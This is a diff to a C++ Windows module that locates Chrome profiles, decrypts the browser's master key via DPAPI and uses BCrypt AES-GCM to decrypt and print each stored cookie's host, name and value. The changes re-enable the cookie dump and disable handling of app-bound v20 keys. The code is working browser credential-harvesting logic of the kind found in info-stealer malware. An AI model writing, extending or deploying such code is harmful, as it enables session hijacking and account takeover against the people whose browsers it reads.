@@ -20,15 +20,15 @@ void mod_Info::test_Data() {
 	//	}
 		std::cout << "COOKIES FOR " << profile.strName << "\n==================================\n";
 		for (Cookie nCookie : this->m_ProfileCookies(profile.strPath, profile.strName)) {
-			if (nCookie.strValue != "ENCRYPTED_ERR" && nCookie.strValue != "") {
-				/*std::cout << "creation_utc: " << nCookie.strCreationUTC << "\n";
+			if (nCookie.strValue != "" && nCookie.strValue != "V20 Cookie :v" && nCookie.strValue != "ENCRYPTED_ERR") {
+				std::cout << "creation_utc: " << nCookie.strCreationUTC << "\n";
 				std::cout << "host_key: " << nCookie.strHostKey << "\n";
 				std::cout << "name: " << nCookie.strName << "\n";
 				std::cout << "value: " << nCookie.strValue << "\n";
 				std::cout << "path: " << nCookie.strPath << "\n";
 				std::cout << "expires_utc: " << nCookie.strExpiresUTC << "\n";
 				std::cout << "last_access_utc: " << nCookie.strLastAccessUTC << "\n";
-				std::cout << "last_updatE_utc: " << nCookie.strLastUpdateUTC << "\n";*/
+				std::cout << "last_updatE_utc: " << nCookie.strLastUpdateUTC << "\n";
 			}
 		}
 		std::cout << "\n==================================\n";
@@ -44,9 +44,9 @@ std::string mod_Info::m_DecryptData(const std::string& strPass) {
 	
 	if (!this->isBcrptOK || encSize < 31) {
 		return strOut;
+	}else if (strPass.substr(0, 3) == "v20") {
+		return "V20 Cookie :v";
 	}
-
-	std::string version = strPass.substr(0, 3);
 
 	NTSTATUS nStatus = 0;
 
@@ -73,7 +73,7 @@ std::string mod_Info::m_DecryptData(const std::string& strPass) {
 	authInfo.cbTag = 16;
 	authInfo.dwFlags &= ~BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG;
 
-	nStatus = BCryptDecrypt((version == "v20" ? this->hKey2 : this->hKey), vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, NULL, NULL, &uPlainSize, 0);
+	nStatus = BCryptDecrypt(this->hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, NULL, NULL, &uPlainSize, 0);
 	if (!BCRYPT_SUCCESS(nStatus)) {
 		_DBG_("BCryptDecrypt_1 error", GetLastError());
 		return strOut;
@@ -81,7 +81,7 @@ std::string mod_Info::m_DecryptData(const std::string& strPass) {
 
 	vc_Plain.resize(uPlainSize);
 
-	nStatus = BCryptDecrypt((version == "v20" ? this->hKey2 : this->hKey), vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, vc_Plain.data(), uPlainSize, &uPlainSize, 0);
+	nStatus = BCryptDecrypt(this->hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, vc_Plain.data(), uPlainSize, &uPlainSize, 0);
 	if (!BCRYPT_SUCCESS(nStatus)) {
 		_DBG_("BCryptDecrypt_2", nStatus);
 		return strOut;
@@ -103,7 +103,6 @@ std::string mod_Info::m_DecryptMasterKey(const std::string& strPass) {
 
 	memcpy(encryptedPass.pbData, strTmp.data(), (int)encryptedPass.cbData);
 	
-	
 	if (!::CryptUnprotectData(
 		&encryptedPass, // In Data
 		NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
@@ -121,7 +120,8 @@ std::string mod_Info::m_DecryptMasterKey(const std::string& strPass) {
 	}
 	
 	free(encryptedPass.pbData); encryptedPass.pbData = NULL;
-
+	LocalFree(decryptedPass.pbData);
+	
 	return strOut;
 }
 
@@ -189,19 +189,21 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 			//                          Desencriptar llave maestra
 			//##################################################################################
 			std::string strMasterKey = base64_decode(jeyson["os_crypt"]["encrypted_key"]);
-			std::string strBoundKey = base64_decode(jeyson["os_crypt"]["app_bound_encrypted_key"]);
+			
+			//v20 cookies :v
+			//std::string strBoundKey = base64_decode(jeyson["os_crypt"]["app_bound_encrypted_key"]);
 			
 			strMasterKey = strMasterKey.substr(5, strMasterKey.size() - 5);
-			strBoundKey = strBoundKey.substr(4, strBoundKey.size() - 4);
+			//strBoundKey = strBoundKey.substr(4, strBoundKey.size() - 4);
 
 			strMasterKey = this->m_DecryptMasterKey(strMasterKey);
-			strBoundKey = this->m_DecryptMasterKey(strBoundKey);
+			//strBoundKey = this->m_DecryptMasterKey(strBoundKey);
 
 			this->vcChromeKey.resize(strMasterKey.size());
-			this->vcBoundKey.resize(strBoundKey.size());
+			//this->vcBoundKey.resize(strBoundKey.size());
 
 			memcpy(this->vcChromeKey.data(), strMasterKey.data(), strMasterKey.size());
-			memcpy(this->vcBoundKey.data(), strBoundKey.data(), strBoundKey.size());
+			//memcpy(this->vcBoundKey.data(), strBoundKey.data(), strBoundKey.size());
 
 			DATA_BLOB MasterKey;
 			MasterKey.cbData = this->vcChromeKey.size();
@@ -214,7 +216,7 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 				this->isBcrptOK = true;
 			}
 
-			MasterKey.cbData = this->vcBoundKey.size();
+			/*MasterKey.cbData = this->vcBoundKey.size();
 			MasterKey.pbData = this->vcBoundKey.data();
 
 			nStatus = BCryptGenerateSymmetricKey(this->hAlgorithm, &this->hKey2, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
@@ -224,7 +226,7 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 			}
 			else {
 				this->isBcrptOK = true;
-			}
+			}*/
 			//##################################################################################
 			//##################################################################################
 		}
